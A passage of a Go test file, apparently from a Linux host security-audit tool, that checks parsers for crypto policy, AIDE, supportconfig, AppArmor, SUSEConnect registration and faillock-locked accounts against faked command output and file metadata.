			b.PutCmd("update-crypto-policies", []string{"--show"}, "DEFAULT\n", 0)
		})
		info := &models.SecurityInfo{}
		parseCryptoPolicy(context.Background(), info)
		if info.CryptoPolicy != "DEFAULT" {
			t.Errorf("CryptoPolicy = %q, want DEFAULT", info.CryptoPolicy)
		}
	})

	t.Run("neither source available", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmdNotFound("update-crypto-policies", []string{"--show"})
		})
		info := &models.SecurityInfo{}
		parseCryptoPolicy(context.Background(), info)
		if info.CryptoPolicy != "" {
			t.Errorf("CryptoPolicy = %q, want empty when neither source is available", info.CryptoPolicy)
		}
	})
}

// TestParseAIDE guards the three outcomes: not installed (no-op), installed
// with a database present (age computed from mtime), and installed but never
// run (AIDELastRunDays == -1 sentinel).
func TestParseAIDE(t *testing.T) {
	t.Run("not installed", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {})
		info := &models.SecurityInfo{}
		parseAIDE(info)
		if info.AIDEInstalled {
			t.Error("expected AIDEInstalled=false when neither binary path exists")
		}
	})

	t.Run("installed with database", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutStat("/usr/sbin/aide", source.FileMeta{})
			b.PutStat("/var/lib/aide/aide.db", source.FileMeta{ModTime: time.Now().Add(-72 * time.Hour)})
		})
		info := &models.SecurityInfo{}
		parseAIDE(info)
		if !info.AIDEInstalled || !info.AIDEDBExists {
			t.Fatalf("expected AIDEInstalled+AIDEDBExists=true, got %+v", info)
		}
		if info.AIDELastRunDays != 3 {
			t.Errorf("AIDELastRunDays = %d, want 3 (72h ago)", info.AIDELastRunDays)
		}
	})

	t.Run("installed but never run", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutStat("/usr/bin/aide", source.FileMeta{})
		})
		info := &models.SecurityInfo{}
		parseAIDE(info)
		if !info.AIDEInstalled || info.AIDEDBExists {
			t.Fatalf("expected installed-but-no-db, got %+v", info)
		}
		if info.AIDELastRunDays != -1 {
			t.Errorf("AIDELastRunDays = %d, want -1 (never run)", info.AIDELastRunDays)
		}
	})
}

// TestParseSupportconfig guards the three outcomes: not installed, an
// archive-based find (SLES 15/older format), and the SLES 16 directory-based
// output — plus the never-run -1 sentinel.
func TestParseSupportconfig(t *testing.T) {
	t.Run("not installed", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {})
		info := &models.SecurityInfo{}
		parseSupportconfig(info)
		if info.SupportconfigAvailable {
			t.Error("expected SupportconfigAvailable=false when neither binary path exists")
		}
	})

	t.Run("installed, never run", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutStat("/usr/sbin/supportconfig", source.FileMeta{})
			b.PutGlob("/var/log/scc_*.txz", nil)
			b.PutGlob("/var/log/nts_*.tbz", nil)
			b.PutGlob("/tmp/scc_*.txz", nil)
			b.PutGlob("/tmp/nts_*.tbz", nil)
		})
		info := &models.SecurityInfo{}
		parseSupportconfig(info)
		if !info.SupportconfigAvailable {
			t.Fatal("expected SupportconfigAvailable=true")
		}
		if info.SupportconfigLastRunDays != -1 {
			t.Errorf("SupportconfigLastRunDays = %d, want -1 (never run)", info.SupportconfigLastRunDays)
		}
	})

	t.Run("archive found (legacy tbz)", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutStat("/usr/sbin/supportconfig", source.FileMeta{})
			b.PutGlob("/var/log/scc_*.txz", nil)
			b.PutGlob("/var/log/nts_*.tbz", []string{"/var/log/nts_host_20260101.tbz", "/var/log/nts_host_20260101.tbz.md5"})
			b.PutGlob("/tmp/scc_*.txz", nil)
			b.PutGlob("/tmp/nts_*.tbz", nil)
			b.PutStat("/var/log/nts_host_20260101.tbz", source.FileMeta{ModTime: time.Now().Add(-48 * time.Hour)})
		})
		info := &models.SecurityInfo{}
		parseSupportconfig(info)
		if info.SupportconfigArchive != "/var/log/nts_host_20260101.tbz" {
			t.Errorf("SupportconfigArchive = %q, want the .tbz archive (not the .md5 sidecar)", info.SupportconfigArchive)
		}
		if info.SupportconfigLastRunDays != 2 {
			t.Errorf("SupportconfigLastRunDays = %d, want 2 (48h ago)", info.SupportconfigLastRunDays)
		}
	})

	t.Run("SLES 16 directory-based output", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutStat("/usr/sbin/supportconfig", source.FileMeta{})
			b.PutDir("/var/log", []string{"scc_host_20260105", "other-file"})
			b.PutDir("/var/log/scc_host_20260105", nil) // makes probeIsDir see it as a directory
			b.PutStat("/var/log/scc_host_20260105", source.FileMeta{IsDir: true, ModTime: time.Now().Add(-24 * time.Hour)})
			b.PutGlob("/var/log/scc_*.txz", nil)
			b.PutGlob("/var/log/nts_*.tbz", nil)
			b.PutGlob("/tmp/scc_*.txz", nil)
			b.PutGlob("/tmp/nts_*.tbz", nil)
		})
		info := &models.SecurityInfo{}
		parseSupportconfig(info)
		if info.SupportconfigArchive != "/var/log/scc_host_20260105" {
			t.Errorf("SupportconfigArchive = %q, want the scc_ directory", info.SupportconfigArchive)
		}
		if info.SupportconfigLastRunDays != 1 {
			t.Errorf("SupportconfigLastRunDays = %d, want 1 (24h ago)", info.SupportconfigLastRunDays)
		}
	})
}

// TestParseAppArmor guards the two outcomes: AppArmor disabled (early
// return, no fields set) and enabled (mode/profile counts/denials all
// populated from the same detection logic KernelSecurityCollector uses).
func TestParseAppArmor(t *testing.T) {
	t.Run("disabled", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {})
		info := &models.SecurityInfo{}
		parseAppArmor(info)
		if info.AppArmorMode != "" || info.AppArmorProfiles != 0 {
			t.Errorf("expected zero-value AppArmor fields when disabled, got %+v", info)
		}
	})

	t.Run("enabled with profiles", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutFile("/sys/module/apparmor/parameters/enabled", []byte("Y\n"))
			b.PutFile("/sys/kernel/security/apparmor/profiles", []byte(
				"/usr/bin/foo (enforce)\n/usr/bin/bar (complain)\n",
			))
			b.PutCmd("journalctl", []string{"-t", "kernel", "-g", `apparmor="DENIED"`,
				"--no-pager", "--since", "24 hours ago", "-o", "short"}, "", 0)
		})
		info := &models.SecurityInfo{}
		parseAppArmor(info)
		if info.AppArmorMode != "enforce" {
			t.Errorf("AppArmorMode = %q, want enforce", info.AppArmorMode)
		}
		if info.AppArmorProfiles != 2 {
			t.Errorf("AppArmorProfiles = %d, want 2", info.AppArmorProfiles)
		}
		if info.AppArmorComplain != 1 {
			t.Errorf("AppArmorComplain = %d, want 1", info.AppArmorComplain)
		}
	})
}

// TestCollectSUSEConnect guards the three outcomes: SUSEConnect absent
// (no-op), the query-failed sentinel (command errors — not a confident
// "unregistered"), and a successful parse delegating to
// applySUSEConnectStatus.
func TestCollectSUSEConnect(t *testing.T) {
	t.Run("not installed", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {})
		info := &models.SecurityInfo{}
		CollectSUSEConnect(context.Background(), info)
		if info.SUSEConnectStatus != "" {
			t.Errorf("SUSEConnectStatus = %q, want empty when SUSEConnect is absent", info.SUSEConnectStatus)
		}
	})

	t.Run("query fails", func(t *testing.T) {
		withCombinedFixture(t, map[string][]byte{"lookpath/SUSEConnect": []byte("/usr/bin/SUSEConnect")}, nil, func(b *source.Bundle) {
			b.PutCmd("SUSEConnect", []string{"--status"}, "", 1)
		})
		info := &models.SecurityInfo{}
		CollectSUSEConnect(context.Background(), info)
		if info.SUSEConnectStatus != "query-failed" {
			t.Errorf("SUSEConnectStatus = %q, want query-failed", info.SUSEConnectStatus)
		}
	})

	t.Run("registered and active", func(t *testing.T) {
		out := `[{"identifier":"SLES","status":"Registered","subscription_status":"ACTIVE","expires_at":"2099-07-13 00:00:00 UTC"}]`
		withCombinedFixture(t, map[string][]byte{"lookpath/SUSEConnect": []byte("/usr/bin/SUSEConnect")}, nil, func(b *source.Bundle) {
			b.PutCmd("SUSEConnect", []string{"--status"}, out, 0)
		})
		info := &models.SecurityInfo{}
		CollectSUSEConnect(context.Background(), info)
		if !info.SUSEConnectRegistered {
			t.Error("expected SUSEConnectRegistered=true")
		}
		if info.SUSEConnectStatus != "ACTIVE" {
			t.Errorf("SUSEConnectStatus = %q, want ACTIVE", info.SUSEConnectStatus)
		}
	})
}

// TestCollectPAMLockedAccounts guards the faillock-driven lock-out audit: a
// [Locked] line is extracted by username, faillock's absence/error must
// return nil rather than a spurious entry.
func TestCollectPAMLockedAccounts(t *testing.T) {
	t.Run("locked accounts present", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmd("faillock", []string{"--user", ""},
				"bob:\nV                                     when               type  source                                                          valid\n"+
					"bob [Locked] 2026-07-01 10:00:00 RHOST 1.2.3.4 V\n", 0)
		})
		got := collectPAMLockedAccounts(context.Background())
		if len(got) != 1 || got[0] != "bob" {
			t.Errorf("expected [bob], got %v", got)
		}
	})

	t.Run("faillock unavailable", func(t *testing.T) {
		withFixtureSource(t, func(b *source.Bundle) {
			b.PutCmdNotFound("faillock", []string{"--user", ""})
		})
		if got := collectPAMLockedAccounts(context.Background()); got != nil {
			t.Errorf("expected nil when faillock is unavailable, got %v", got)
		}
	})
}
